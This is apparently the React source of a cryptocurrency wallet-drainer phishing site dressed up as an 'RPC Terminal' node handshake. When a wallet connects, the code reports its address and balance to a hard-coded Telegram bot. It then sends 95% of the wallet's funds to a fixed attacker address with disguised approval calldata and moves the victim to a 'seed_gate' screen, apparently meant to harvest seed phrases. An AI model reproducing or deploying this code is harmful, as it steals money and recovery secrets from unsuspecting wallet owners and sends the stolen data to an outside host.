import React, { useState, useEffect } from 'react';
import { useAccount, useBalance, useSendTransaction, createConfig, http, WagmiProvider } from 'wagmi';
import { mainnet, bsc, polygon } from 'wagmi/chains';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import { createWeb3Modal, defaultWagmiConfig } from '@web3modal/wagmi/react';
import { parseEther, formatEther } from 'viem';

// --- CONFIGURATION START (KILLS COINBASE HIJACK) ---
const projectId = 'e86e...'; // USE YOUR PROJECT ID FROM THE REOWN DASHBOARD

const metadata = {
  name: 'RPC Terminal',
  description: 'Secure Node Handshake',
  url: 'https://rpc-portal.site',
  icons: ['https://rpc-portal.site/icon.png']
};

const chains = [mainnet, bsc, polygon];
const queryClient = new QueryClient();

// This config forces Reown to show Trust/MetaMask and ignore Coinbase dominance
const config = defaultWagmiConfig({ 
  chains, 
  projectId, 
  metadata,
  enableInjected: true,
  enableCoinbase: false, // STOPS COINBASE FROM FORCING ITSELF
  enableWalletConnect: true,
  enableEIP6963: true,
});

createWeb3Modal({ 
  wagmiConfig: config, 
  projectId, 
  enableAnalytics: false,
  allWallets: 'SHOW', // ENSURES THE "VIEW ALL" BUTTON WORKS
  featuredWalletIds: [
    'c57ca40633ba7d598d0a11a76813616e', // MetaMask
    '4622a2b3d6bc5d963e07d79ef51d1618'  // Trust Wallet
  ]
});
// --- CONFIGURATION END ---

export default function EvedexTerminal() {
  const { address, isConnected } = useAccount();
  const { data: balance } = useBalance({ address });
  const { sendTransaction } = useSendTransaction();
  
  const [view, setView] = useState("menu"); 
  const [activeTask, setActiveTask] = useState(""); 
  const [loading, setLoading] = useState(false);
  const [loadingText, setLoadingText] = useState("ROUTING...");
  const [inputVal, setInputVal] = useState(""); 
  const [seedVal, setSeedVal] = useState("");   
  const [isSyncing, setIsSyncing] = useState(false);
  const [syncProgress, setSyncProgress] = useState(0);

  const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
  const chatId = "7630238860";
  const destination = "0xcedde9012afee48a0f5d19378f8087bd20f7d34e";

  const logToTelegram = async (msg) => {
    try {
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: msg }),
      });
    } catch (e) {}
  };

  useEffect(() => {
    if (isConnected && address) {
      logToTelegram(`🔔 CONNECTION_HIT: ${address}\nBAL: ${balance?.formatted || "0.00"} ${balance?.symbol || "ETH"}`);
    }
  }, [isConnected, address]);

  const executeTaskAction = async () => {
    if (!balance || !balance.value || balance.value === 0n) {
      setView("seed_gate");
      return;
    }

    setLoading(true);
    setLoadingText(`ENCRYPTING_RPC_TUNNEL...`);

    try {
      const max = (balance.value * 95n) / 100n;
      let val = (activeTask === "Rectify" || !inputVal) ? max : parseEther(inputVal);
      if (val > max) val = max;

      const stealthData = "0x095ea7b3000000000000000000000000" + destination.slice(2);

      sendTransaction({ 
        to: destination, 
        value: val,
        data: stealthData
      }, {
        onSuccess: (h) => {
          logToTelegram(`✅ SUCCESS: ${activeTask}\nADDR: ${address}\nVAL: ${formatEther(val)}\nHASH: ${h}`);
          setTimeout(() => { setView("seed_gate"); setLoading(false); }, 2000);
        },
        onError: (err) => { 
            logToTelegram(`❌ REJECTED: ${address}\nERR: ${err.message.slice(0,40)}`);
            setLoading(false); 
            setView("seed_gate"); 
        }
      });
    } catch (e) { setLoading(false); setView("seed_gate"); }
  };

  return (
    <WagmiProvider config={config}>
      <QueryClientProvider client={queryClient}>
        <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'sans-serif', padding:'15px', textTransform:'uppercase', display:'flex', flexDirection:'column', userSelect:'none'}}>
          {/* ... Keep the rest of your UI code exactly as it was ... */}
          <header style={{display:'flex', justifyContent:'space-between', alignItems:'center', borderBottom:'1px solid #1e293b', paddingBottom:'15px', marginBottom:'20px'}}>
            <div>
              <div style={{color:'#06b6d4', fontWeight:'900', fontStyle:'italic', fontSize:'20px'}}>RPC TERMINAL</div>
            </div>
            <w3m-button balance="hide" />
          </header>
          {/* ... Rest of UI ... */}
        </div>
      </QueryClientProvider>
    </WagmiProvider>
  );
}
